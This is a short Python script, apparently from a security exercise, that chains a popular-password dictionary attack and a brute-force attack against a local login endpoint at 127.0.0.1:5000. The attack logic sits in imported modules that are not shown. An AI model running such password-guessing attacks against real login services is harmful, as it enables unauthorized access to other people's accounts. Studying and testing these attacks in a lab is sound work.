import popularPasswordsGenerator
import bruteforce

generator1 = popularPasswordsGenerator.PopularPasswordsGenerator("http://127.0.0.1:5000/auth", open('popular.txt').read())

generator2 = bruteforce.BruteForceAttack("http://127.0.0.1:5000/auth",
                                         used_popular=generator1.generate_popular_password() == 'SUCCESS')
generator2.brute_force_attack()
